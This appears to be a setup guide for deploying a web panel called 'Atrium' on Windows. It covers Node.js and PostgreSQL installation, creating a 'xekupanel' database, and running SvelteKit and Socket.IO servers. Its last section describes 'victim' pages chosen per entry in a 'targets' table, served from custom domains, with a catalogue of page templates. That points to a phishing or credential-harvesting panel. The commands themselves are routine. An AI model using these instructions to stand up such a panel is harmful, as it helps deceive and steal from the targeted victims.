# Atrium Setup Guide (Windows)

This guide will walk you through the steps to get the Atrium application running on your Windows machine.

## Prerequisites

Before you begin, you'll need to have the following software installed:

*   **Node.js**: You can download it from [https://nodejs.org/](https://nodejs.org/).
*   **PostgreSQL**: You can download it from [https://www.postgresql.org/download/windows/](https://www.postgresql.org/download/windows/). During the installation, you'll be asked to set a password for the `postgres` user. Remember this password, as you'll need it later.

## 1. Install Dependencies

Open a terminal or command prompt, navigate to the project's root directory, and run the following command to install the project's dependencies:

```bash
npm install
```

## 2. Set up the Database

1.  **Open `psql`**: Open the `psql` command-line tool. You can usually find it in the PostgreSQL installation directory. You'll be prompted to enter the password you set during the PostgreSQL installation.

2.  **Create the database**: Run the following command to create the `xekupanel` database:

    ```sql
    CREATE DATABASE xekupanel;
    ```

3.  **Connect to the database**: Connect to the newly created database with the following command:

    ```sql
    \c xekupanel
    ```

4.  **Run the `database.sql` script**: Run the `database.sql` script to create the tables and schema. You can do this by running the following command in `psql`:

    ```sql
    \i path/to/your/project/database.sql
    ```

    Replace `path/to/your/project/` with the actual path to the project's root directory.

## 3. Run the Application

You'll need to have two terminals or command prompts open for this step.

1.  **Terminal 1: Run the SvelteKit development server**: In the first terminal, run the following command to start the SvelteKit development server:

    ```bash
    npm run dev
    ```

2.  **Terminal 2: Run the Socket.IO server**: In the second terminal, run the following command to start the `server.js` file, which contains the Socket.IO server:

    ```bash
    node server.js
    ```

Once both servers are running, you should be able to access the application in your web browser at `http://localhost:5173`.

## Accessing the "Victim" Pages

The "victim" pages are not accessed through a direct URL. Instead, the application dynamically displays these pages based on the `starting_page` value in the `USERS` table and the `currentpage` value in the `targets` table. The `GUILDDOMAINS` table is used to serve these pages from a custom domain.

The available "victim" pages are defined in the `src/lib/data/pageConfigurations.json` file. This file groups the pages into categories and provides a description, icon, and preview image for each page.
